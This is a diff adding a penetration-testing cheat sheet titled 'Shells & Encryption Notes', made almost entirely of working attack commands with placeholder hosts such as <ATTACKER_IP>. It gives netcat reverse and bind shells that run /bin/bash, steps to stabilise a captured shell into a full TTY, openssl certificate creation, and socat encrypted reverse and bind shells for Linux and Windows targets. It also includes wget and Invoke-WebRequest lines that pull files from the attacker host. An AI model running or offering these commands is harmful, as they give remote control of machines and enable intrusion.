@@ -1,0 +1,114 @@
+Shells & Encryption Notes
+=========================
+Placeholders: <ATTACKER_IP>, <TARGET_IP>, <PORT>. Real IPs removed.
+
+--------------------------------------------------------------------------
+REVERSE SHELL EXAMPLE
+--------------------------------------------------------------------------
+attacker$ nc -lvnp <PORT>
+Listening on 0.0.0.0 <PORT>
+
+target$ nc <ATTACKER_IP> <PORT> -e /bin/bash
+
+Connection received on <ATTACKER_IP> <random-src-port>
+whoami
+shell-user
+
+--------------------------------------------------------------------------
+BIND SHELL EXAMPLE
+--------------------------------------------------------------------------
+target$ nc -lvnp <PORT> -e /bin/bash
+listening on [any] <PORT> ...
+
+attacker$ nc <TARGET_IP> <PORT>
+whoami
+shell-user
+
+--------------------------------------------------------------------------
+SPAWNING A TTY (stabilise the shell)
+--------------------------------------------------------------------------
+# 1. On the attacker, learn terminal size:
+stty size
+# 50 220
+
+# 2. Start the listener:
+nc -lvnp <PORT>
+
+# 3. Target connects back:
+target$ nc <ATTACKER_IP> <PORT> -e /bin/bash
+
+# 4. Upgrade shell to a PTY:
+attacker$ python3 -c 'import pty; pty.spawn("/bin/bash")'
+target$
+
+# 5. Set terminal type:
+target$ export TERM=xterm
+
+# 6. Background the listener, fix local tty, resume:
+^Z
+attacker$ stty raw -echo
+attacker$ fg
+
+# 7. Match the rows/cols:
+target$ stty rows 50 cols 220
+
+# (many more variants exist for a fully stable shell)
+
+--------------------------------------------------------------------------
+CERTIFICATE GENERATION & MANAGEMENT
+--------------------------------------------------------------------------
+attacker$ openssl req -newkey rsa:2048 -nodes \
+  -keyout shell.key -x509 -days 365 -out shell.crt
+# (answer the certificate prompts)
+
+attacker$ cat shell.key shell.crt > shell.pem
+attacker$ ls -la shell.*
+-rw-r--r-- 1 attacker attacker 1350 Dec 15 10:30 shell.crt
+-rw------- 1 attacker attacker 1708 Dec 15 10:30 shell.key
+-rw-r--r-- 1 attacker attacker 3058 Dec 15 10:30 shell.pem
+
+--------------------------------------------------------------------------
+ENCRYPTED REVERSE SHELL
+--------------------------------------------------------------------------
+# Attacker listener:
+socat OPENSSL-LISTEN:<PORT>,cert=shell.pem,verify=0 -
+
+# Linux target:
+socat OPENSSL:<ATTACKER_IP>:<PORT>,verify=0 EXEC:/bin/bash
+
+# Windows target:
+socat OPENSSL:<ATTACKER_IP>:<PORT>,verify=0 EXEC:powershell.exe,pipes
+
+--------------------------------------------------------------------------
+ENCRYPTED BIND SHELL
+--------------------------------------------------------------------------
+# Host the cert:
+sudo python3 -m http.server 80
+
+# Target downloads the cert:
+target$ wget http://<ATTACKER_IP>/shell.pem -O /tmp/shell.pem
+
+# Target listens:
+target$ socat OPENSSL-LISTEN:8443,cert=/tmp/shell.pem,verify=0 EXEC:"bash -li"
+listening on 0.0.0.0:8443
+
+# Attacker connects:
+attacker$ socat OPENSSL:<TARGET_IP>:8443,verify=0 -
+whoami
+victim-user
+id
+uid=1000(victim-user) gid=1000(victim-user) groups=1000(victim-user)
+
+# Windows variant:
+PS> Invoke-WebRequest -Uri http://<ATTACKER_IP>/shell.pem -OutFile C:\Windows\Temp\shell.pem
+PS> socat OPENSSL-LISTEN:8443,cert=C:\Windows\Temp\shell.pem,verify=0 EXEC:cmd.exe,pipes
+
+--------------------------------------------------------------------------
+ENCRYPTED TTY SHELL
+--------------------------------------------------------------------------
+# Attacker:
+socat OPENSSL-LISTEN:<PORT>,cert=shell.pem,verify=0 FILE:`tty`,raw,echo=0
+
+# Target:
+socat OPENSSL:<ATTACKER_IP>:<PORT>,verify=0 \
+  EXEC:"bash -li",pty,stderr,sigint,setsid,sane
